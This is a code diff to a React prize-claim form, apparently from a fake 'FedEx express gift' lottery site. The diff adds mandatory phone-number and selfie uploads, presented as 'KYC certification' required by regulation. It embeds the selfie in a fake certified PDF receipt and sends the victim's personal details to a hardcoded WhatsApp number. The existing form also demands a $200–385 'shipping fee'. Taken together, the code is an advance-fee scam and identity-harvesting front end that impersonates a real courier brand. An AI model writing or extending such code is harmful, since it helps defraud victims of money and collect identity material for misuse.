@@ -1,8 +1,11 @@
 "use client";
 
-import React, { useState } from "react";
+import React, { useState, useRef } from "react";
 import { motion } from "framer-motion";
-import { Download, MessageSquare, CheckCircle2, ShieldAlert, User, Mail, MapPin, Lock, Sparkles, Truck, Gift } from "lucide-react";
+import { 
+  Download, MessageSquare, CheckCircle2, ShieldAlert, User, Mail, MapPin, 
+  Lock, Sparkles, Truck, Gift, Camera, Phone, UploadCloud, RefreshCw, AlertCircle
+} from "lucide-react";
 import { jsPDF } from "jspdf";
 import { LuxuryItem } from "./BoxGridGame";
 import { useLanguage } from "@/context/LanguageContext";
@@ -17,24 +20,62 @@ const ADMIN_WHATSAPP_NUMBER = "224663267096";
 
 export default function ClaimForm({ winningPrize, winningItems = [] }: ClaimFormProps) {
   const [nom, setNom] = useState("");
+  const [telephone, setTelephone] = useState("");
   const [email, setEmail] = useState("");
   const [adresse, setAdresse] = useState("");
+  const [selfieDataUrl, setSelfieDataUrl] = useState<string | null>(null);
+  const [selfieError, setSelfieError] = useState<string | null>(null);
   const [acceptShipping, setAcceptShipping] = useState(false);
   const [isSubmitted, setIsSubmitted] = useState(false);
   const [pdfGenerated, setPdfGenerated] = useState(false);
   const [transactionId, setTransactionId] = useState("");
+  const [isGeneratingPdf, setIsGeneratingPdf] = useState(false);
 
+  const fileInputRef = useRef<HTMLInputElement>(null);
   const { t } = useLanguage();
 
   // Dynamic shipping fee calculated for the 3 items bundle (between $200 and $385 USD)
   const maxFee = winningItems.length > 0 ? Math.max(...winningItems.map((i) => i.shippingFee)) : 350;
   const shippingFee = maxFee;
 
+  // Handle Selfie selection & file reader
+  const handleSelfieChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (!file) return;
+
+    if (!file.type.startsWith("image/")) {
+      setSelfieError("Veuillez sélectionner un fichier image valide (JPG, PNG, WebP).");
+      return;
+    }
+
+    if (file.size > 8 * 1024 * 1024) {
+      setSelfieError("L'image ne doit pas dépasser 8 Mo.");
+      return;
+    }
+
+    setSelfieError(null);
+    const reader = new FileReader();
+    reader.onload = () => {
+      setSelfieDataUrl(reader.result as string);
+    };
+    reader.readAsDataURL(file);
+  };
+
   const handleFormSubmit = (e: React.FormEvent) => {
     e.preventDefault();
 
-    if (!nom.trim() || !email.trim() || !adresse.trim()) {
+    if (!nom.trim() || !telephone.trim() || !email.trim() || !adresse.trim()) {
       alert("Veuillez remplir tous les champs obligatoires (*)");
+      return;
+    }
+
+    // MANDATORY SELFIE VALIDATION
+    if (!selfieDataUrl) {
+      setSelfieError("⚠️ Un selfie officiel est OBLIGATOIRE pour certifier votre identité de gagnant et générer votre reçu sécurisé.");
+      const selfieElement = document.getElementById("selfie-upload-container");
+      if (selfieElement) {
+        selfieElement.scrollIntoView({ behavior: "smooth" });
+      }
       return;
     }
 
@@ -43,15 +84,19 @@ export default function ClaimForm({ winningPrize, winningItems = [] }: ClaimForm
       return;
     }
 
+    setIsGeneratingPdf(true);
+
     // Generate unique transaction reference
     const refId = "FDX-" + Math.random().toString(36).substring(2, 9).toUpperCase() + "-" + Date.now().toString().slice(-4);
     setTransactionId(refId);
 
-    // Generate PDF receipt in selected language with jsPDF
-    generatePDFReceipt(refId);
-
-    setIsSubmitted(true);
-    setPdfGenerated(true);
+    // Generate PDF receipt in selected language with jsPDF & embedded Selfie
+    setTimeout(() => {
+      generatePDFReceipt(refId);
+      setIsSubmitted(true);
+      setPdfGenerated(true);
+      setIsGeneratingPdf(false);
+    }, 400);
   };
 
   const generatePDFReceipt = (refId: string) => {
@@ -80,16 +125,16 @@ export default function ClaimForm({ winningPrize, winningItems = [] }: ClaimForm
     // Header Title
     doc.setTextColor(255, 215, 0); // Gold
     doc.setFont("helvetica", "bold");
-    doc.setFontSize(24);
-    doc.text(t("pdfHeaderTitle"), 105, 20, { align: "center" });
+    doc.setFontSize(22);
+    doc.text(t("pdfHeaderTitle"), 105, 18, { align: "center" });
 
-    doc.setFontSize(11);
+    doc.setFontSize(10.5);
     doc.setTextColor(255, 255, 255);
-    doc.text(t("pdfHeaderSub"), 105, 28, { align: "center" });
+    doc.text(t("pdfHeaderSub"), 105, 26, { align: "center" });
 
-    doc.setFontSize(9);
+    doc.setFontSize(8.5);
     doc.setTextColor(200, 200, 200);
-    doc.text(t("pdfLicence"), 105, 35, { align: "center" });
+    doc.text(t("pdfLicence"), 105, 33, { align: "center" });
 
     // Gold decorative bar
     doc.setFillColor(255, 215, 0);
@@ -98,41 +143,58 @@ export default function ClaimForm({ winningPrize, winningItems = [] }: ClaimForm
     // Body Container Frame
     doc.setDrawColor(255, 215, 0);
     doc.setLineWidth(0.8);
-    doc.rect(15, 55, 180, 215);
+    doc.rect(15, 52, 180, 228);
 
     // Transaction Metadata Box
     doc.setFillColor(248, 250, 252);
-    doc.rect(20, 62, 170, 25, "F");
+    doc.rect(20, 58, 170, 24, "F");
 
-    doc.setFontSize(10);
+    doc.setFontSize(9.5);
     doc.setTextColor(51, 65, 85);
-    doc.text(t("pdfRefLabel"), 25, 71);
+    doc.text(t("pdfRefLabel"), 25, 66);
     doc.setFont("helvetica", "bold");
     doc.setTextColor(185, 28, 28);
-    doc.text(refId, 85, 71);
+    doc.text(refId, 85, 66);
 
     doc.setFont("helvetica", "normal");
     doc.setTextColor(51, 65, 85);
-    doc.text(t("pdfDateLabel"), 25, 80);
+    doc.text(t("pdfDateLabel"), 25, 75);
     doc.setFont("helvetica", "bold");
     doc.setTextColor(15, 23, 42);
-    doc.text(currentDate, 85, 80);
+    doc.text(currentDate, 85, 75);
 
-    // Winner Info Table
-    doc.setFontSize(12);
+    // Winner Info Header
+    doc.setFontSize(11);
     doc.setFont("helvetica", "bold");
     doc.setTextColor(15, 23, 42);
-    doc.text(t("pdfSectionTitle"), 25, 98);
+    doc.text(t("pdfSectionTitle"), 25, 90);
 
     doc.setDrawColor(226, 232, 240);
-    doc.line(25, 101, 185, 101);
+    doc.line(25, 93, 185, 93);
 
-    doc.setFontSize(10);
+    // Embed Winner Selfie Photo in PDF top-right of table
+    if (selfieDataUrl) {
+      try {
+        doc.setDrawColor(218, 165, 32);
+        doc.setLineWidth(0.5);
+        doc.roundedRect(147, 98, 38, 42, 2, 2);
+        doc.addImage(selfieDataUrl, "JPEG", 148, 99, 36, 40);
+        doc.setFontSize(7.5);
+        doc.setFont("helvetica", "bold");
+        doc.setTextColor(22, 163, 74);
+        doc.text("✓ SELFIE VÉRIFIÉ", 166, 144, { align: "center" });
+      } catch (err) {
+        console.error("Could not render image to PDF:", err);
+      }
+    }
+
+    doc.setFontSize(9);
     doc.setFont("helvetica", "normal");
     
     // Rows translated according to selected language
     const rows = [
       [t("pdfRowNom"), nom],
+      ["Numéro Téléphone :", telephone],
       [t("pdfRowEmail"), email],
       [t("pdfRowAdresse"), adresse],
       [t("pdfRowItem"), itemsText],
@@ -140,55 +202,61 @@ export default function ClaimForm({ winningPrize, winningItems = [] }: ClaimForm
       [t("pdfRowStatus"), t("pdfStatusValue")],
     ];
 
-    let startY = 108;
+    let startY = 100;
+    const maxWidth = selfieDataUrl ? 58 : 95;
+
     rows.forEach(([label, value]) => {
       doc.setTextColor(100, 116, 139);
       doc.text(label, 25, startY);
       doc.setFont("helvetica", "bold");
       doc.setTextColor(15, 23, 42);
       
-      // Wrap text if address or value is long
-      const splitVal = doc.splitTextToSize(value, 95);
-      doc.text(splitVal, 88, startY);
+      const splitVal = doc.splitTextToSize(value, maxWidth);
+      doc.text(splitVal, 82, startY);
 
       doc.setFont("helvetica", "normal");
-      startY += (splitVal.length * 5.5) + 2.5;
+      startY += (splitVal.length * 4.6) + 2.4;
     });
+
+    // Make sure we clear space below the selfie
+    if (startY < 148) {
+      startY = 148;
+    }
 
     // Winning Prize Box
     doc.setFillColor(254, 242, 242);
     doc.setDrawColor(239, 68, 68);
-    doc.rect(25, startY + 4, 160, 32, "FD");
+    doc.rect(25, startY + 4, 160, 28, "FD");
 
-    doc.setFontSize(11);
+    doc.setFontSize(10);
     doc.setTextColor(185, 28, 28);
     doc.setFont("helvetica", "bold");
-    doc.text(t("pdfNetTotalLabel"), 105, startY + 14, { align: "center" });
+    doc.text(t("pdfNetTotalLabel"), 105, startY + 13, { align: "center" });
 
-    doc.setFontSize(16);
+    doc.setFontSize(15);
     doc.setTextColor(22, 163, 74);
-    doc.text(`$ ${winningPrize.toLocaleString("en-US")} USD  +  3 CADEAUX DE LUXE`, 105, startY + 26, { align: "center" });
+    doc.text(`$ ${winningPrize.toLocaleString("en-US")} USD  +  3 CADEAUX DE LUXE`, 105, startY + 24, { align: "center" });
 
     // Official Certification Stamp
     doc.setDrawColor(22, 163, 74);
-    doc.setLineWidth(1.5);
-    doc.rect(130, startY + 43, 55, 22);
-    doc.setFontSize(9);
+    doc.setLineWidth(1.3);
+    doc.rect(132, startY + 36, 53, 20);
+    doc.setFontSize(8.5);
     doc.setTextColor(22, 163, 74);
     doc.setFont("helvetica", "bold");
-    doc.text("FedexGift", 157.5, startY + 50, { align: "center" });
-    doc.text(t("pdfStampApproved"), 157.5, startY + 56, { align: "center" });
-    doc.text(t("pdfStampGuaranteed"), 157.5, startY + 61, { align: "center" });
+    doc.text("FedEx express gift 🎁", 158.5, startY + 42, { align: "center" });
+    doc.text(t("pdfStampApproved"), 158.5, startY + 48, { align: "center" });
+    doc.text(t("pdfStampGuaranteed"), 158.5, startY + 53, { align: "center" });
 
     // Security & Instructions Footer
-    doc.setFontSize(8.5);
+    doc.setFontSize(8);
     doc.setFont("helvetica", "italic");
     doc.setTextColor(100, 116, 139);
     const footerLines = doc.splitTextToSize(t("pdfFooterInstruction"), 165);
-    doc.text(footerLines, 25, startY + 73);
+    doc.text(footerLines, 25, startY + 62);
 
     // Save File
-    doc.save(`recu_gain_fedex_gift_${refId}.pdf`);
+    doc.save(`recu_gain_fedex_express_gift_${refId}.pdf`);
   };
 
   const getWhatsAppLink = () => {
@@ -199,8 +267,10 @@ export default function ClaimForm({ winningPrize, winningItems = [] }: ClaimForm
     const message = `${t("waMessageHello")} ${winningPrize.toLocaleString("en-US")} $ + ${itemsListStr} ${t("waMessageOnSite")}
 
 ${t("waName")} ${nom}
+Numéro Tel: ${telephone}
 ${t("waEmail")} ${email}
 ${t("waAddress")} ${adresse}
+Selfie d'identité: [Inclus sur le reçu officiel PDF certifié]
 ${t("waItem")} ${itemsListStr}
 ${t("waShippingFee")} $ ${shippingFee} USD
 ${t("waRef")} ${transactionId}
@@ -279,6 +349,22 @@ ${t("waClosing", { fee: shippingFee })}`;
               />
             </div>
 
+            {/* Téléphone / WhatsApp */}
+            <div>
+              <label className="block text-xs font-bold text-gray-300 uppercase tracking-wider mb-2 flex items-center gap-1.5">
+                <Phone className="w-4 h-4 text-emerald-400" />
+                Numéro de Téléphone (WhatsApp actif) *
+              </label>
+              <input
+                type="tel"
+                required
+                value={telephone}
+                onChange={(e) => setTelephone(e.target.value)}
+                placeholder="Ex: +33 6 12 34 56 78 / +224 620..."
+                className="w-full bg-brandDark-700/80 border border-gray-700 focus:border-yellow-400 rounded-xl px-4 py-3.5 text-white placeholder-gray-500 text-sm focus:outline-none transition shadow-inner"
+              />
+            </div>
+
             {/* Email */}
             <div>
               <label className="block text-xs font-bold text-gray-300 uppercase tracking-wider mb-2 flex items-center gap-1.5">
@@ -314,6 +400,86 @@ ${t("waClosing", { fee: shippingFee })}`;
               </span>
             </div>
 
+            {/* SELFIE OBLIGATOIRE DU GAGNANT */}
+            <div id="selfie-upload-container" className="space-y-2">
+              <label className="block text-xs font-bold text-yellow-300 uppercase tracking-wider flex items-center justify-between">
+                <span className="flex items-center gap-1.5">
+                  <Camera className="w-4 h-4 text-amber-400" />
+                  Selfie officiel du gagnant (Obligatoire) *
+                </span>
+                <span className="text-[10px] text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/30">
+                  Certification KYC
+                </span>
+              </label>
+
+              <div className={`border-2 border-dashed rounded-2xl p-4 text-center transition-all ${
+                selfieDataUrl ? "border-emerald-500/70 bg-emerald-950/20" : "border-yellow-500/40 bg-brandDark-800/80 hover:border-yellow-400"
+              }`}>
+                <input
+                  type="file"
+                  accept="image/*"
+                  capture="user"
+                  ref={fileInputRef}
+                  onChange={handleSelfieChange}
+                  className="hidden"
+                />
+
+                {!selfieDataUrl ? (
+                  <div
+                    onClick={() => fileInputRef.current?.click()}
+                    className="cursor-pointer py-4 flex flex-col items-center justify-center gap-2"
+                  >
+                    <div className="w-14 h-14 rounded-full bg-yellow-500/10 border border-yellow-500/30 flex items-center justify-center text-yellow-400">
+                      <Camera className="w-7 h-7" />
+                    </div>
+                    <p className="text-xs sm:text-sm font-bold text-white">
+                      Prendre ou importer un selfie maintenant
+                    </p>
+                    <p className="text-[11px] text-gray-400 max-w-sm">
+                      Requis par la réglementation pour prouver votre identité et figurer sur votre reçu certifié PDF.
+                    </p>
+                    <div className="inline-flex items-center gap-1.5 text-xs text-yellow-300 font-bold bg-yellow-500/20 px-3 py-1.5 rounded-lg border border-yellow-500/40 mt-1">
+                      <UploadCloud className="w-4 h-4" />
+                      Appuyez pour ouvrir l'appareil photo
+                    </div>
+                  </div>
+                ) : (
+                  <div className="flex flex-col sm:flex-row items-center gap-4 justify-between">
+                    <div className="flex items-center gap-3">
+                      <img
+                        src={selfieDataUrl}
+                        alt="Selfie gagnant"
+                        className="w-16 h-16 rounded-xl object-cover border-2 border-emerald-400 shadow-md"
+                      />
+                      <div className="text-left">
+                        <span className="text-xs font-bold text-emerald-400 flex items-center gap-1">
+                          <CheckCircle2 className="w-4 h-4" />
+                          Selfie validé & intégré au reçu
+                        </span>
+                        <span className="text-[10px] text-gray-400 block">Photo conforme aux normes d'audit</span>
+                      </div>
+                    </div>
+
+                    <button
+                      type="button"
+                      onClick={() => fileInputRef.current?.click()}
+                      className="text-xs text-yellow-300 hover:text-yellow-200 underline flex items-center gap-1 py-1 px-3 bg-brandDark-900 rounded-lg border border-yellow-500/30"
+                    >
+                      <RefreshCw className="w-3.5 h-3.5" />
+                      Changer la photo
+                    </button>
+                  </div>
+                )}
+              </div>
+
+              {selfieError && (
+                <p className="text-xs text-red-400 font-semibold flex items-center gap-1 bg-red-950/40 p-2.5 rounded-lg border border-red-500/40">
+                  <AlertCircle className="w-4 h-4 shrink-0 text-red-400" />
+                  {selfieError}
+                </p>
+              )}
+            </div>
+
             {/* MANDATORY SHIPPING FEE ACCEPTANCE CHECKBOX */}
             <div className="bg-gradient-to-r from-yellow-500/10 via-amber-500/20 to-yellow-500/10 border-2 border-yellow-400/80 rounded-2xl p-4 space-y-3 shadow-lg">
               <div className="flex items-center justify-between text-xs font-bold text-yellow-300">
@@ -344,11 +510,12 @@ ${t("waClosing", { fee: shippingFee })}`;
             <motion.button
               whileHover={{ scale: 1.02 }}
               whileTap={{ scale: 0.98 }}
+              disabled={isGeneratingPdf}
               type="submit"
-              className="w-full py-4 bg-gradient-to-r from-red-600 via-red-700 to-red-600 hover:from-red-500 hover:to-red-600 text-white font-black text-lg rounded-2xl shadow-xl shadow-red-600/50 border border-yellow-400 flex items-center justify-center gap-2 cursor-pointer mt-4"
+              className="w-full py-4 bg-gradient-to-r from-red-600 via-red-700 to-red-600 hover:from-red-500 hover:to-red-600 disabled:opacity-50 text-white font-black text-lg rounded-2xl shadow-xl shadow-red-600/50 border border-yellow-400 flex items-center justify-center gap-2 cursor-pointer mt-4"
             >
               <Sparkles className="w-5 h-5 text-yellow-300 animate-spin" />
-              <span>{t("submitCTA")}</span>
+              <span>{isGeneratingPdf ? "Génération sécurisée du PDF..." : t("submitCTA")}</span>
             </motion.button>
           </form>
         ) : (
